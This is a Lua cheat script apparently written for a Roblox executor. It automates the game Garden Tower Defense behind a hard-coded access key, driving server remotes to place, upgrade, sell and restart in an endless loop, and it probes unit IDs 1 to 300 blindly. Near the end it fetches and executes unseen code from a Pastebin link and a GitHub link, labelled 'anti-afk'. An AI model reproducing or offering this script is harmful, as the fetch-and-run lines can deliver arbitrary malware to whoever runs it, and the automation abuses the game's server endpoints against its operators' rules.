--// Garden Tower Defense Script - Complete Automation
local Players = game:GetService("Players")
local plr = Players.LocalPlayer

print(plr.Name .. " loaded the script. Waiting for key...")

--// Improved Key GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = plr:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
Frame.BorderSizePixel = 0
Frame.BackgroundTransparency = 0.1
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Frame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(80, 120, 200)
UIStroke.Thickness = 2
UIStroke.Parent = Frame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 60)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "GARDEN TOWER DEFENSE"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 24
Title.TextStrokeTransparency = 0.8
Title.Parent = Frame

local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1, 0, 0, 30)
SubTitle.Position = UDim2.new(0, 0, 0, 40)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "Enter Access Key"
SubTitle.TextColor3 = Color3.fromRGB(200, 200, 220)
SubTitle.Font = Enum.Font.Gotham
SubTitle.TextSize = 16
SubTitle.Parent = Frame

-- Key Input
local TextBoxContainer = Instance.new("Frame")
TextBoxContainer.Size = UDim2.new(1, -40, 0, 50)
TextBoxContainer.Position = UDim2.new(0, 20, 0, 90)
TextBoxContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
TextBoxContainer.BorderSizePixel = 0
TextBoxContainer.Parent = Frame

local TextBoxCorner = Instance.new("UICorner")
TextBoxCorner.CornerRadius = UDim.new(0, 8)
TextBoxCorner.Parent = TextBoxContainer

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(1, -20, 1, -10)
TextBox.Position = UDim2.new(0, 10, 0, 5)
TextBox.PlaceholderText = "Enter key here..."
TextBox.Text = ""
TextBox.Font = Enum.Font.Gotham
TextBox.TextSize = 18
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1
TextBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
TextBox.Parent = TextBoxContainer

-- Check Button
local CheckBtn = Instance.new("TextButton")
CheckBtn.Size = UDim2.new(1, -40, 0, 50)
CheckBtn.Position = UDim2.new(0, 20, 0, 160)
CheckBtn.Text = "VERIFY KEY"
CheckBtn.Font = Enum.Font.GothamBold
CheckBtn.TextSize = 18
CheckBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CheckBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
CheckBtn.BorderSizePixel = 0
CheckBtn.Parent = Frame

local CheckBtnCorner = Instance.new("UICorner")
CheckBtnCorner.CornerRadius = UDim.new(0, 8)
CheckBtnCorner.Parent = CheckBtn

-- Status Label
local Label = Instance.new("TextLabel")
Label.Size = UDim2.new(1, -40, 0, 40)
Label.Position = UDim2.new(0, 20, 0, 220)
Label.BackgroundTransparency = 1
Label.Text = ""
Label.Font = Enum.Font.Gotham
Label.TextSize = 14
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.TextWrapped = true
Label.Parent = Frame

--// Remotes
local rs = game:GetService("ReplicatedStorage")
local remotes = rs:WaitForChild("RemoteFunctions")

-- Auto Skip (enable once at start)
task.delay(2, function()
    pcall(function()
        remotes.ToggleAutoSkip:InvokeServer(true)
        warn("[System] Auto Skip Enabled")
    end)
end)

--=== GAME SCRIPTS - COMPLETE AUTOMATION ===--

function load3xScript()
    warn("[System] Loaded 3x Speed Script - Complete Automation")
    remotes.ChangeTickSpeed:InvokeServer(3)

    local difficulty = "dif_apocalypse"
    local firstRafflesiaId = nil
    local secondRafflesiaId = nil
    
    local placements = {
        {
            time = 5, unit = "unit_rafflesia", slot = "2",
            data = {Valid=true,PathIndex=1,Position=Vector3.new(51.70485305786133,-21.75,-54.78313446044922),
                DistanceAlongPath=5.6959664442733,
                CF=CFrame.new(51.70485305786133,-21.75,-54.78313446044922,0.7071068286895752,0,-0.7071067690849304,-0,1,-0,0.7071068286895752,0,0.7071067690849304),
                Rotation=180}
        },
        {
            time = 8, unit = "unit_rafflesia", slot = "2",
            data = {Valid=true,PathIndex=2,Position=Vector3.new(-33.59211730957031,-21.749000549316406,-21.671918869018555),
                DistanceAlongPath=46.379028904084905,
                CF=CFrame.new(-33.59211730957031,-21.749000549316406,-21.671918869018555,0.9244806170463562,0,0.38122913241386414,-0,1,-0,-0.38122913241386414,0,0.9244806170463562),
                Rotation=180}
        }
    }

    local function placeUnit(unitName, slot, data, isFirstRafflesia)
        local success = pcall(function()
            return remotes.PlaceUnit:InvokeServer(unitName, data)
        end)
        
        if success then
            warn("[Placing] "..unitName.." at "..os.clock())
            -- Store placement order for ID tracking
            if isFirstRafflesia and not firstRafflesiaId then
                task.delay(1, function() -- Small delay to let unit register
                    findUnitId(true) -- Find first rafflesia ID
                end)
            elseif not isFirstRafflesia and not secondRafflesiaId then
                task.delay(1, function() -- Small delay to let unit register
                    findUnitId(false) -- Find second rafflesia ID
                end)
            end
        else
            warn("[Placing] "..unitName.." at "..os.clock().." - Failed")
        end
    end

    local function findUnitId(isFirstRafflesia)
        warn("[ID Search] Looking for "..(isFirstRafflesia and "first" or "second").." rafflesia...")
        
        local found = false
        for id = 1, 300 do
            local success, result = pcall(function()
                return remotes.UpgradeUnit:InvokeServer(id)
            end)
            
            if success and result == true then
                if isFirstRafflesia and not firstRafflesiaId then
                    firstRafflesiaId = id
                    warn("[ID Found] First rafflesia ID: "..id)
                    found = true
                    break
                elseif not isFirstRafflesia and not secondRafflesiaId then
                    secondRafflesiaId = id
                    warn("[ID Found] Second rafflesia ID: "..id)
                    found = true
                    break
                end
            end
            task.wait(0.02) -- Very small delay between attempts
        end
        
        if not found then
            warn("[ID Search] Could not find "..(isFirstRafflesia and "first" or "second").." rafflesia ID")
        end
    end

    local function upgradeUnit(unitId, unitName)
        if unitId then
            local success, result = pcall(function()
                return remotes.UpgradeUnit:InvokeServer(unitId)
            end)
            if success and result then
                warn("[Upgrading] "..unitName.." ID: "..unitId.." - Success")
                return true
            else
                warn("[Upgrading] "..unitName.." ID: "..unitId.." - Failed")
                return false
            end
        else
            warn("[Upgrading] No "..unitName.." ID available")
            return false
        end
    end

    local function sellUnit(unitId, unitName)
        if unitId then
            local success, result = pcall(function()
                return remotes.SellUnit:InvokeServer(unitId)
            end)
            if success and result then
                warn("[Selling] "..unitName.." ID: "..unitId.." - Success")
                return true
            else
                warn("[Selling] "..unitName.." ID: "..unitId.." - Failed")
                return false
            end
        else
            warn("[Selling] No "..unitName.." ID available")
            return false
        end
    end

    local function startGame()
        -- Reset unit IDs for new game
        firstRafflesiaId = nil
        secondRafflesiaId = nil
        
        warn("[Game Start] Choosing Apocalypse difficulty")
        remotes.PlaceDifficultyVote:InvokeServer(difficulty)
        
        -- Place units
        placeUnit(placements[1].unit, placements[1].slot, placements[1].data, true) -- First rafflesia
        task.delay(3, function() -- 8-5=3 second delay for second rafflesia
            placeUnit(placements[2].unit, placements[2].slot, placements[2].data, false) -- Second rafflesia
        end)
        
        -- Upgrade first rafflesia at 38 seconds
        task.delay(38, function()
            if firstRafflesiaId then
                upgradeUnit(firstRafflesiaId, "First Rafflesia")
            else
                warn("[Upgrade] First rafflesia ID not found, searching...")
                findUnitId(true)
                task.wait(1)
                if firstRafflesiaId then
                    upgradeUnit(firstRafflesiaId, "First Rafflesia")
                end
            end
        end)
        
        -- Upgrade second rafflesia at 63 seconds (1:03)
        task.delay(63, function()
            if secondRafflesiaId then
                upgradeUnit(secondRafflesiaId, "Second Rafflesia")
            else
                warn("[Upgrade] Second rafflesia ID not found, searching...")
                findUnitId(false)
                task.wait(1)
                if secondRafflesiaId then
                    upgradeUnit(secondRafflesiaId, "Second Rafflesia")
                end
            end
        end)
        
        -- Sell second rafflesia at 80 seconds (1:20)
        task.delay(80, function()
            if secondRafflesiaId then
                sellUnit(secondRafflesiaId, "Second Rafflesia")
            else
                warn("[Sell] Second rafflesia ID not found, searching...")
                findUnitId(false)
                task.wait(1)
                if secondRafflesiaId then
                    sellUnit(secondRafflesiaId, "Second Rafflesia")
                end
            end
        end)
        
        -- Auto-restart at 98 seconds (1:35 + 3 seconds wait)
        task.delay(98, function()
            warn("[Restart] Game ended, restarting in 3 seconds...")
            task.wait(3)
            remotes.RestartGame:InvokeServer()
            warn("[Restart] Game restarted, starting new cycle...")
            task.wait(2) -- Small delay before next game starts
            startGame() -- Recursive call for infinite loop
        end)
    end

    -- Start the first game
    startGame()
end

--=== SIMPLIFIED SPEED MENU ===--
local function showSpeedMenu()
    Frame.Size = UDim2.new(0, 450, 0, 350)
    Frame.Position = UDim2.new(0.5, -225, 0.5, -175)
    
    Title.Text = "SELECT SPEED MODE"
    SubTitle.Text = "Complete Automation"
    TextBox.Visible = false
    CheckBtn.Visible = false
    Label.Visible = false

    -- Instructions
    local Instructions = Instance.new("TextLabel")
    Instructions.Size = UDim2.new(1, -40, 0, 80)
    Instructions.Position = UDim2.new(0, 20, 0, 60)
    Instructions.BackgroundTransparency = 1
    Instructions.Text = "⚠️ Complete Automation\n• Place Rafflesias: 5s & 8s\n• Upgrade 1st: 38s\n• Upgrade 2nd: 63s\n• Sell 2nd: 80s\n• Auto-restart: 98s"
    Instructions.Font = Enum.Font.Gotham
    Instructions.TextSize = 14
    Instructions.TextColor3 = Color3.fromRGB(255, 200, 100)
    Instructions.TextWrapped = true
    Instructions.Parent = Frame

    -- Only 3x Speed Button
    local btn3x = Instance.new("TextButton")
    btn3x.Size = UDim2.new(1, -40, 0, 120)
    btn3x.Position = UDim2.new(0, 20, 0, 160)
    btn3x.Text = "3× SPEED\nComplete Automation\nFull Cycle: 98s"
    btn3x.BackgroundColor3 = Color3.fromRGB(220, 100, 100)
    btn3x.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn3x.Font = Enum.Font.GothamBold
    btn3x.TextSize = 18
    btn3x.BorderSizePixel = 0
    btn3x.Parent = Frame

    local btn3xCorner = Instance.new("UICorner")
    btn3xCorner.CornerRadius = UDim.new(0, 10)
    btn3xCorner.Parent = btn3x

    btn3x.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
        load3xScript()
    end)
end

--=== KEY CHECK ===--
CheckBtn.MouseButton1Click:Connect(function()
    if TextBox.Text:upper() == "GTD2025" then
        Label.Text = "✅ Key Verified! Loading speed selection..."
        Label.TextColor3 = Color3.fromRGB(100, 255, 100)
        CheckBtn.BackgroundColor3 = Color3.fromRGB(80, 180, 80)
        CheckBtn.Text = "SUCCESS!"
        
        task.delay(1.5, showSpeedMenu)
    else
        TextBox.Text = ""
        Label.Text = "❌ Invalid Key! Please try again."
        Label.TextColor3 = Color3.fromRGB(255, 100, 100)
        CheckBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 80)
        
        task.delay(1, function()
            CheckBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
            CheckBtn.Text = "VERIFY KEY"
        end)
    end
end)

-- Add some visual effects
TextBox.Focused:Connect(function()
    TextBoxContainer.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
end)

TextBox.FocusLost:Connect(function()
    TextBoxContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
end)

-- Load anti-afk scripts
loadstring(game:HttpGet("https://pastebin.com/raw/HkAmPckQ"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()

-- Force GUI to be on top
ScreenGui.DisplayOrder = 999
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

print("GUI setup complete - Should be visible now!")
